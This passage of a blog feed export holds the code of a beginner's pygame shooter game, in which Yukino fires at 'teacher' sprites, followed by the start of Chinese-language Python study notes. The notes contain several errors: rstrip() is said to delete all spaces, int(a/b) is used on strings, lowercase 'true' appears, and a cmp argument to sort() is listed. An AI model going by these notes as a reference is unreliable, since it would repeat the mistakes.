class="line">        sb.prep_level()</span><br><span class="line">        create_fleet(number,screen,yukino,teachers)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_teachers_bottom</span>(<span class="params">number,screen,stats,sb,yukino,teachers,bullets</span>):</span></span><br><span class="line">    screen_rect=screen.get_rect()</span><br><span class="line">    <span class="keyword">for</span> teacher <span class="keyword">in</span> teachers.sprites():</span><br><span class="line">        <span class="keyword">if</span> teacher.rect.bottom&gt;=screen_rect.bottom:</span><br><span class="line">            yukino_hit(number,stats,screen,sb,yukino,teacher,bullets)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_high_score</span>(<span class="params">stats,sb</span>):</span></span><br><span class="line">    <span class="keyword">if</span> stats.score&gt;stats.high_score:</span><br><span class="line">        stats.high_score=stats.score</span><br><span class="line">        sb.prep_high_score()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_fleet_direction</span>(<span class="params">number,teachers</span>):</span></span><br><span class="line">    <span class="keyword">for</span> teacher <span class="keyword">in</span> teachers.sprites():</span><br><span class="line">        teacher.rect.y+=number.fleet_drop_speed</span><br><span class="line">    number.fleet_direction*=-<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_screen</span>(<span class="params">number,screen,stats,sb,yukino,teachers,bullets,play_button</span>):</span></span><br><span class="line">    screen.fill(number.bg_color)</span><br><span class="line">    <span class="keyword">for</span> bullet <span class="keyword">in</span> bullets.sprites():</span><br><span class="line">        bullet.draw_bullet()</span><br><span class="line">    yukino.blitme()</span><br><span class="line">    teachers.draw(screen)</span><br><span class="line">    sb.show_score()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> stats.game_active:</span><br><span class="line">        play_button.draw_button()</span><br><span class="line">    pygame.display.flip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_bullets</span>(<span class="params">number,screen,stats,sb,yukino,teachers,bullets</span>):</span></span><br><span class="line">    bullets.update()</span><br><span class="line">    <span class="keyword">for</span> bullet <span class="keyword">in</span> bullets.copy():</span><br><span class="line">        <span class="keyword">if</span> bullet.rect.bottom&lt;=<span class="number">0</span>:</span><br><span class="line">            bullets.remove(bullet)</span><br><span class="line">    check_bullet_teacher_collisions(number,screen,stats,sb,yukino,teachers,bullets)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_teachers</span>(<span class="params">number,screen,stats,sb,yukino,teachers,bullets</span>):</span></span><br><span class="line">    check_fleet_edges(number,teachers)</span><br><span class="line">    teachers.update()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> pygame.sprite.spritecollideany(yukino,teachers):</span><br><span class="line">        yukino_hit(number,screen,stats,sb,yukino,teachers,bullets)</span><br><span class="line"></span><br><span class="line">    check_teachers_bottom(number,screen,stats,sb,yukino,teachers,bullets)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_number_teachers_x</span>(<span class="params">number,teacher_width</span>):</span></span><br><span class="line">    available_space_x=number.screen_width-<span class="number">2</span>*teacher_width</span><br><span class="line">    number_teachers_x=<span class="built_in">int</span>(available_space_x/(<span class="number">2</span>*teacher_width))</span><br><span class="line">    <span class="keyword">return</span> number_teachers_x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_number_rows</span>(<span class="params">number,yukino_height,teacher_height</span>):</span></span><br><span class="line">    available_space_y=(number.screen_height-(<span class="number">3</span>*teacher_height)-yukino_height)</span><br><span class="line">    number_rows=<span class="built_in">int</span>(available_space_y/(<span class="number">2</span>*teacher_height))</span><br><span class="line">    <span class="keyword">return</span> number_rows</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_teacher</span>(<span class="params">number,screen,teachers,teacher_number,row_number</span>):</span></span><br><span class="line">    teacher=Teacher(number,screen)</span><br><span class="line">    teacher_width=teacher.rect.width</span><br><span class="line">    teacher.x=teacher_width+<span class="number">2</span>*teacher_width*teacher_number</span><br><span class="line">    teacher.rect.x=teacher.x</span><br><span class="line">    teacher.rect.y=teacher.rect.height+<span class="number">2</span>*teacher.rect.height*row_number</span><br><span class="line">    teachers.add(teacher)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_fleet</span>(<span class="params">number,screen,yukino,teachers</span>):</span></span><br><span class="line">    teacher=Teacher(number,screen)</span><br><span class="line">    number_teachers_x=get_number_teachers_x(number,teacher.rect.width)</span><br><span class="line">    number_rows=get_number_rows(number,yukino.rect.height,teacher.rect.height)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> row_number <span class="keyword">in</span> <span class="built_in">range</span>(number_rows):</span><br><span class="line">        <span class="keyword">for</span> teacher_number <span class="keyword">in</span> <span class="built_in">range</span>(number_teachers_x):</span><br><span class="line">            create_teacher(number,screen,teachers,teacher_number,row_number)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">yukino_hit</span>(<span class="params">number,screen,stats,sb,yukino,teachers,bullets</span>):</span></span><br><span class="line">    <span class="keyword">if</span> stats.yukino_left&gt;<span class="number">0</span>:</span><br><span class="line">        stats.yukino_left-=<span class="number">1</span></span><br><span class="line">        sb.prep_yukino()</span><br><span class="line">        teachers.empty()</span><br><span class="line">        bullets.empty()</span><br><span class="line">        create_fleet(number,screen,yukino,teachers)</span><br><span class="line">        yukino.center_yukino()</span><br><span class="line">        sleep(number.stop_time)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        stats.game_active=<span class="literal">False</span></span><br><span class="line">        pygame.mouse.set_visible(<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<h2 id="yukino"><a href="#yukino" class="headerlink" title="yukino"></a>yukino</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pygame.sprite <span class="keyword">import</span> Sprite</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yukino</span>(<span class="params">Sprite</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,number,screen</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Yukino,self).__init__()</span><br><span class="line">        self.screen=screen</span><br><span class="line">        self.number=number</span><br><span class="line"></span><br><span class="line">        self.image=pygame.image.load(<span class="string">&#x27;images/Yukino.bmp&#x27;</span>)</span><br><span class="line">        self.rect=self.image.get_rect()</span><br><span class="line">        self.screen_rect=screen.get_rect()</span><br><span class="line"></span><br><span class="line">        self.rect.centerx=self.screen_rect.centerx</span><br><span class="line">        self.rect.bottom=self.screen_rect.bottom</span><br><span class="line"></span><br><span class="line">        self.center=<span class="built_in">float</span>(self.rect.centerx)</span><br><span class="line"></span><br><span class="line">        self.moving_right=<span class="literal">False</span></span><br><span class="line">        self.moving_left=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.moving_right <span class="keyword">and</span> self.rect.right&lt;self.screen_rect.right:</span><br><span class="line">            self.center+=self.number.yukino_speed_factor</span><br><span class="line">        <span class="keyword">if</span> self.moving_left <span class="keyword">and</span> self.rect.left&gt;<span class="literal">False</span>:</span><br><span class="line">            self.center-=self.number.yukino_speed_factor</span><br><span class="line">        self.rect.centerx=self.center</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">blitme</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen.blit(self.image,self.rect)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">center_yukino</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.center=self.screen_rect.centerx</span><br></pre></td></tr></table></figure>
<h2 id="button"><a href="#button" class="headerlink" title="button"></a>button</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame.font</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Button</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,number,screen,msg</span>):</span></span><br><span class="line">        self.screen=screen</span><br><span class="line">        self.screen_rect=screen.get_rect()</span><br><span class="line"></span><br><span class="line">        self.width,self.height=<span class="number">200</span>,<span class="number">50</span></span><br><span class="line">        self.button_color=(<span class="number">241</span>,<span class="number">158</span>,<span class="number">194</span>)</span><br><span class="line">        self.text_color=(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>)</span><br><span class="line">        self.font=pygame.font.SysFont(<span class="literal">None</span>,<span class="number">48</span>)</span><br><span class="line"></span><br><span class="line">        self.rect=pygame.Rect(<span class="literal">False</span>,<span class="literal">False</span>,self.width,self.height)</span><br><span class="line">        self.rect.center=self.screen_rect.center</span><br><span class="line"></span><br><span class="line">        self.prep_msg(msg)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prep_msg</span>(<span class="params">self,msg</span>):</span></span><br><span class="line">        self.msg_image=self.font.render(msg,<span class="literal">True</span>,self.text_color,self.button_color)</span><br><span class="line">        self.msg_image_rect=self.msg_image.get_rect()</span><br><span class="line">        self.msg_image_rect.center=self.rect.center</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">draw_button</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen.fill(self.button_color,self.rect)</span><br><span class="line">        self.screen.blit(self.msg_image,self.msg_image_rect)</span><br></pre></td></tr></table></figure>
<h2 id="scoreboard"><a href="#scoreboard" class="headerlink" title="scoreboard"></a>scoreboard</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame.font</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pygame.sprite <span class="keyword">import</span> Group</span><br><span class="line"><span class="keyword">from</span> yukino <span class="keyword">import</span> Yukino</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Scoreboard</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,number,screen,stats</span>):</span></span><br><span class="line">        self.screen=screen</span><br><span class="line">        self.screen_rect=screen.get_rect()</span><br><span class="line">        self.number=number</span><br><span class="line">        self.stats=stats</span><br><span class="line"></span><br><span class="line">        self.text_color=(<span class="number">30</span>,<span class="number">30</span>,<span class="number">30</span>)</span><br><span class="line">        self.font=pygame.font.SysFont(<span class="literal">None</span>,<span class="number">48</span>)</span><br><span class="line"></span><br><span class="line">        self.prep_score()</span><br><span class="line">        self.prep_high_score()</span><br><span class="line">        self.prep_level()</span><br><span class="line">        self.prep_yukino()</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prep_score</span>(<span class="params">self</span>):</span></span><br><span class="line">        score_str=<span class="string">&quot;&#123;:,&#125;&quot;</span>.<span class="built_in">format</span>(self.stats.score)</span><br><span class="line">        self.score_image=self.font.render(score_str,</span><br><span class="line">        <span class="literal">True</span>,self.text_color,self.number.bg_color)</span><br><span class="line"></span><br><span class="line">        self.score_rect=self.score_image.get_rect()</span><br><span class="line">        self.score_rect.right=self.screen_rect.right-<span class="number">20</span></span><br><span class="line">        self.score_rect.top=<span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show_score</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen.blit(self.score_image,self.score_rect)</span><br><span class="line">        self.screen.blit(self.high_score_image,self.high_score_rect)</span><br><span class="line">        self.screen.blit(self.level_image,self.level_rect)</span><br><span class="line">        self.yukino.draw(self.screen)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prep_high_score</span>(<span class="params">self</span>):</span></span><br><span class="line">        high_score_str=<span class="string">&quot;&#123;:,&#125;&quot;</span>.<span class="built_in">format</span>(self.stats.high_score)</span><br><span class="line">        self.high_score_image=self.font.render(high_score_str,</span><br><span class="line">        <span class="literal">True</span>,self.text_color,self.number.bg_color)</span><br><span class="line"></span><br><span class="line">        self.high_score_rect=self.high_score_image.get_rect()</span><br><span class="line">        self.high_score_rect.centerx=self.screen_rect.centerx</span><br><span class="line">        self.high_score_rect.top=self.score_rect.top</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prep_level</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.level_image=self.font.render(<span class="built_in">str</span>(self.stats.level),</span><br><span class="line">            <span class="literal">True</span>,self.text_color,self.number.bg_color)</span><br><span class="line">        </span><br><span class="line">        self.level_rect=self.level_image.get_rect()</span><br><span class="line">        self.level_rect.right=self.score_rect.right</span><br><span class="line">        self.level_rect.top=self.score_rect.bottom+<span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prep_yukino</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.yukino=Group()</span><br><span class="line">        <span class="keyword">for</span> yukino_number <span class="keyword">in</span> <span class="built_in">range</span>(self.stats.yukino_left):</span><br><span class="line">            yukino=Yukino(self.number,self.screen)</span><br><span class="line">            yukino.rect.x=<span class="number">10</span>+yukino_number*yukino.rect.width</span><br><span class="line">            yukino.rect.y=<span class="number">10</span></span><br><span class="line">            self.yukino.add(yukino)</span><br></pre></td></tr></table></figure>
<h2 id="teacher"><a href="#teacher" class="headerlink" title="teacher"></a>teacher</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">from</span> pygame.sprite <span class="keyword">import</span> Sprite</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span>(<span class="params">Sprite</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,number,screen</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Teacher,self).__init__()</span><br><span class="line">        self.screen=screen</span><br><span class="line">        self.number=number</span><br><span class="line"></span><br><span class="line">        self.image=pygame.image.load(<span class="string">&#x27;images/teacher.bmp&#x27;</span>)</span><br><span class="line">        self.rect=self.image.get_rect()</span><br><span class="line"></span><br><span class="line">        self.rect.x=self.rect.width</span><br><span class="line">        self.rect.y=self.rect.height</span><br><span class="line"></span><br><span class="line">        self.x=<span class="built_in">float</span>(self.rect.x)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">blitme</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen.blit(self.image,self.rect)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_edges</span>(<span class="params">self</span>):</span></span><br><span class="line">        screen_rect=self.screen.get_rect()</span><br><span class="line">        <span class="keyword">if</span> self.rect.right&gt;=screen_rect.right:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> self.rect.left&lt;=<span class="literal">False</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.x+=(self.number.teacher_speed_factor*self.number.fleet_direction)</span><br><span class="line">        self.rect.x=self.x</span><br></pre></td></tr></table></figure>
<h2 id="bullet"><a href="#bullet" class="headerlink" title="bullet"></a>bullet</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Settings</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen_width=<span class="number">1200</span></span><br><span class="line">        self.screen_height=<span class="number">750</span></span><br><span class="line">        self.bg_color=(<span class="number">230</span>,<span class="number">230</span>,<span class="number">230</span>)</span><br><span class="line"></span><br><span class="line">        self.yukino_limit=<span class="number">3</span></span><br><span class="line">        </span><br><span class="line">        self.bullet_width=<span class="number">3</span></span><br><span class="line">        self.bullet_height=<span class="number">15</span></span><br><span class="line">        self.bullet_color=<span class="number">60</span>,<span class="number">60</span>,<span class="number">60</span></span><br><span class="line">        self.bullets_allowed=<span class="number">3</span></span><br><span class="line"></span><br><span class="line">        self.speedup_scale=<span class="number">1.1</span></span><br><span class="line">        self.score_scale=<span class="number">10</span></span><br><span class="line">        self.initialize_dynamic_settings()</span><br><span class="line"></span><br><span class="line">        self.stop_time=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initialize_dynamic_settings</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.yukino_speed_factor=<span class="number">1</span></span><br><span class="line">        self.bullet_speed_factor=<span class="number">3</span></span><br><span class="line">        self.teacher_speed_factor=<span class="number">0.5</span></span><br><span class="line">        self.fleet_direction=<span class="number">1</span></span><br><span class="line">        self.teacher_points=<span class="number">50</span></span><br><span class="line">        self.fleet_drop_speed=<span class="number">10</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">increase_speed</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.yukino_speed_factor*=self.speedup_scale</span><br><span class="line">        self.bullet_speed_factor*=self.speedup_scale</span><br><span class="line">        self.teacher_speed_factor*=self.speedup_scale</span><br><span class="line">        self.fleet_drop_speed*=self.speedup_scale</span><br><span class="line">        self.teacher_points=self.teacher_points+self.score_scale</span><br></pre></td></tr></table></figure>

<h2 id="settings"><a href="#settings" class="headerlink" title="settings"></a>settings</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Settings</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen_width=<span class="number">1200</span></span><br><span class="line">        self.screen_height=<span class="number">750</span></span><br><span class="line">        self.bg_color=(<span class="number">230</span>,<span class="number">230</span>,<span class="number">230</span>)</span><br><span class="line"></span><br><span class="line">        self.yukino_limit=<span class="number">3</span></span><br><span class="line">        </span><br><span class="line">        self.bullet_width=<span class="number">3</span></span><br><span class="line">        self.bullet_height=<span class="number">15</span></span><br><span class="line">        self.bullet_color=<span class="number">60</span>,<span class="number">60</span>,<span class="number">60</span></span><br><span class="line">        self.bullets_allowed=<span class="number">3</span></span><br><span class="line"></span><br><span class="line">        self.speedup_scale=<span class="number">1.1</span></span><br><span class="line">        self.score_scale=<span class="number">10</span></span><br><span class="line">        self.initialize_dynamic_settings()</span><br><span class="line"></span><br><span class="line">        self.stop_time=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initialize_dynamic_settings</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.yukino_speed_factor=<span class="number">1</span></span><br><span class="line">        self.bullet_speed_factor=<span class="number">3</span></span><br><span class="line">        self.teacher_speed_factor=<span class="number">0.5</span></span><br><span class="line">        self.fleet_direction=<span class="number">1</span></span><br><span class="line">        self.teacher_points=<span class="number">50</span></span><br><span class="line">        self.fleet_drop_speed=<span class="number">10</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">increase_speed</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.yukino_speed_factor*=self.speedup_scale</span><br><span class="line">        self.bullet_speed_factor*=self.speedup_scale</span><br><span class="line">        self.teacher_speed_factor*=self.speedup_scale</span><br><span class="line">        self.fleet_drop_speed*=self.speedup_scale</span><br><span class="line">        self.teacher_points=self.teacher_points+self.score_scale</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>项目记录</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>游戏</tag>
      </tags>
  </entry>
  <entry>
    <title>Python学习笔记</title>
    <url>/2019/06/19/79dbbcabe6b7/</url>
    <content><![CDATA[<h1 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h1><blockquote>
<p>不知不觉自己已经高中毕业了（并不），这个暑假需要学点什么，然后就买了一本《Python编程从入门到实践》，并夕夕上只要25块，看起来超值。然后暑假就学习如何用Python来编写程序吧，至于C++的康复计划，留到以后有时间再说。所以下面就记录一些经常需要查询的东西，帮助自己学习Python。</p>
</blockquote>
<h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><h2 id="字符串修改"><a href="#字符串修改" class="headerlink" title="字符串修改"></a>字符串修改</h2><p><code>title()</code> 使字符串中单词的一个字母大写 </p>
<p><code>upper()</code> 使字符串中所有字母大写</p>
<p><code>lower()</code> 使字符串中所有字母小写</p>
<hr>
<p>两个字符串可以直接相加：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">First_Name=<span class="string">&quot;Katou&quot;</span></span><br><span class="line">Last_Name=<span class="string">&quot;Megumi&quot;</span></span><br><span class="line">Name=First_Name+<span class="string">&quot; &quot;</span>+Last_Name</span><br><span class="line">print(Name)</span><br></pre></td></tr></table></figure>
<p>输出结果就是 <code>Katou Megumi</code></p>
<hr>
<p>strip 「脱光衣服」</p>
<p><code>rstrip()</code> 删除字符串里所有的空格</p>
<p><code>lstrip()</code> 删除字符串开头的空格</p>
<p><code>strip()</code> 删除字符串开头和末尾的空格</p>
<h2 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h2><p>在Python3中，两个整数相除的结果并非整数，而是浮点数，如果需要得到整除数，则需要将结果强制转换为整数即刻。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a,b=<span class="built_in">input</span>().split()</span><br><span class="line">ans=<span class="built_in">int</span>(a/b)</span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure>
<p>这样输出的就是整数了。</p>
<hr>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p><code>#</code>后面接单行注释</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">下面</span></span><br><span class="line"><span class="string">就可以</span></span><br><span class="line"><span class="string">接</span></span><br><span class="line"><span class="string">多行</span></span><br><span class="line"><span class="string">注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="The-Zen-of-Python"><a href="#The-Zen-of-Python" class="headerlink" title="The Zen of Python"></a>The Zen of Python</h2><table>
<thead>
<tr>
<th>The Zen of Python</th>
<th>Python之禅</th>
</tr>
</thead>
<tbody><tr>
<td>Beautiful is better than ugly.</td>
<td>优美胜于丑陋</td>
</tr>
<tr>
<td>Explicit is better than implicit.</td>
<td>明了胜于晦涩</td>
</tr>
<tr>
<td>Simple is better than complex.</td>
<td>简洁胜于复杂</td>
</tr>
<tr>
<td>Complex is better than complicated.</td>
<td>复杂胜于凌乱</td>
</tr>
<tr>
<td>Flat is better than nested.</td>
<td>扁平胜于嵌套</td>
</tr>
<tr>
<td>Sparse is better than dense.</td>
<td>间隔胜于紧凑</td>
</tr>
<tr>
<td>Readability counts.</td>
<td>可读性很重要</td>
</tr>
<tr>
<td>Special cases aren’t special enough to break the rules.Although practicality beats purity.</td>
<td>即便假借特例的实用性之名，也不可违背这些规则</td>
</tr>
<tr>
<td>Errors should never pass silently.Unless explicitly silenced.</td>
<td>不要包容所有错误，除非你确定需要这样做</td>
</tr>
<tr>
<td>In the face of ambiguity, refuse the temptation to guess.</td>
<td>当存在多种可能，不要尝试去猜测</td>
</tr>
<tr>
<td>There should be one– and preferably only one –obvious way to do it.</td>
<td>而是尽量找一种，最好是唯一一种明显的解决方案</td>
</tr>
<tr>
<td>Although that way may not be obvious at first unless you’re Dutch.</td>
<td>虽然这并不容易，因为你不是 Python 之父</td>
</tr>
<tr>
<td>Now is better than never.Although never is often better than <em>right</em> now.</td>
<td>做也许好过不做，但不假思索就动手还不如不做</td>
</tr>
<tr>
<td>If the implementation is hard to explain, it’s a bad idea.If the implementation is easy to explain, it may be a good idea.</td>
<td>如果你无法向人描述你的方案，那肯定不是一个好方案；反之亦然</td>
</tr>
<tr>
<td>Namespaces are one honking great idea – let’s do more of those!</td>
<td>命名空间是一种绝妙的理念，我们应当多加利用</td>
</tr>
</tbody></table>
<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>列表和C++ 里面的数组是比较相似的，Python里面，列表是线性且连续的，也就是说，不存在两个元素之间有空元素，所以这样就让Python在实现各种操作的时候简单了很多，但是也感觉可操作性就大大降低了，并没有C++的数组灵活。</p>
<p>列表在使用之前，必须声明一个空列表，如<code>a=[]</code>。这样才能实现下一步操作。</p>
<hr>
<p>Python添加新元素的方法是使用<code>append()</code>函数和<code>insert()</code>函数。</p>
<p>append 「附加，增补」</p>
<p>insert 「插入，嵌入」</p>
<p>所以顾名思义，append是在列表末尾增加一个新元素</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a=[<span class="string">&quot;Xorex&quot;</span>]</span><br><span class="line">a.append(<span class="string">&quot; is best!&quot;</span>)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
<p>输出结果就是[‘Xorex’,’ is best!’]</p>
<p>insert是在列表中间添加元素，格式：insert(下标,元素)</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a=[]</span><br><span class="line">a.append(<span class="number">1</span>)</span><br><span class="line">a.append(<span class="number">2</span>)</span><br><span class="line">a.append(<span class="number">3</span>)</span><br><span class="line">print(a)</span><br><span class="line">a.insert(<span class="number">0</span>,<span class="string">&#x27;Number&#x27;</span>)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
<p>这样输出结果就分别为，[1, 2, 3] 和 [‘Number’, 1, 2, 3]，Numer被插入到了下标为0的位置，其他元素往后移动一位。</p>
<hr>
<p>如果要修改某个下标的元素就直接 <code>a[下标]=元素</code> ，即可。</p>
<hr>
<p>如果要删除列表里的元素，那么有下面几种方法：</p>
<ol>
<li><p>使用<code>del</code>删除，如果你已经得知元素下标，可以这样写<code>del a[0]</code>，这样<code>a[0]</code>，也就是a列表里面的第一个元素就被删除了。</p>
</li>
<li><p>使用<code>pop()</code>删除，<code>pop()</code>可以删除制定位置元素并返回删除的元素值，如<code>print(a.pop(2))</code>就会删<code>a</code>列表里面第三个元素并返回删除的元素值，然后输出它。如果你不写弹出下标，那么就会默认删除最后一个元素，并返回最后一个元素的值，有点类似于堆栈，而pop的意思就是弹出。</p>
</li>
<li><p>使用<code>remove()</code>删除元素，<code>a.remove(要删除的元素)</code>就可以删除掉列表中所有为<code>Xorex</code>的元素，如果有多个元素都是<code>Xorex</code>，那么默认删除第一个元素，后面的<code>Xorex</code>保持不变。如果要删除全部，需要用循环不断验证，删除。</p>
</li>
</ol>
<hr>
<p>对列表中元素进行排列，有以下几种方法。</p>
<p><code>sort()</code>进行从小到大排列，并更改列表里面的元素顺序，如果想要从大到小，那么就需要在函数里面添加参数<code>sort(reverse=true)</code></p>
<p>reverse 「颠倒，使翻转」</p>
<p>而同样是排列的<code>sorted()</code>函数作用和<code>sort()</code>是一样的，不同的是<code>sorted()</code>只会返回排列好的列表，而不会更改原来列表里面的元素顺序。</p>
<p><strong>注意</strong> 如果单独使用<code>reverse()</code>函数对列表进行更改的话，并不会排序，只会将列表元素顺序反过来。</p>
<p><code>sort()</code>和<code>sorted()</code>其实是支持自定义排序的，<code>sort(cmp,key,reserve)</code> 其中<code>cmp</code>代表着排序规则，<code>key</code>代表着参与排序的元素，<code>reserve</code>代表着是升序排序还是降序排序。</p>
<hr>
<p>确定列表长度可以使用<code>len()</code>函数，如<code>len(a)</code>就会返回列表<code>a</code>的长度。</p>
<hr>
<p>range 「一系列，范围」</p>
<p><code>range()</code>可以生成一系列的数字，<code>range(5)</code>是生成从<code>0</code>到<code>4</code>的五个数字，而<code>range(1,6)</code>是生成从<code>1</code>到<code>6-1</code>的五个数字。最后<code>range(1,11,2)</code>代表着从<code>1</code>开始，不断加<code>2</code>输出，直到小于等于<code>11-1</code>。</p>
<p>如果需要得知一个列表中的最大值，最小值，总和，可以使用<code>min(a)</code> <code>max(a)</code>和<code>sum(a)</code></p>
<hr>
<p>列表循环的新方法</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a=[x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>)]</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
<p>这样生成的就是从<code>1</code>到<code>10</code>的平方了。</p>
<hr>
<p>列表的复制中，如果使用<code>b=a</code>使列表<code>a</code>的值赋给了列表<code>b</code>。那么实际上<code>a</code>和<code>b</code>就已经是同一个列表了。也就是意味着如果你更改列表<code>a</code>的值，那么列表<code>b</code>的值也会改变。</p>
<p>那么如何避免上面的情况呢，就需要这样来复制:<code>b=a[:]</code>也就是一个一个把<code>a</code>的值给<code>b</code>，这样<code>a</code>和<code>b</code>就是两个不一样的列表了！</p>
<hr>
<p>列表是可以使用二维，或二维以上的列表，具体实现方法就是俄罗斯套娃一样，列表里面套列表（元组，字典也是可以的），下标的表示方法和C++一样，比如下面的代码:</p>
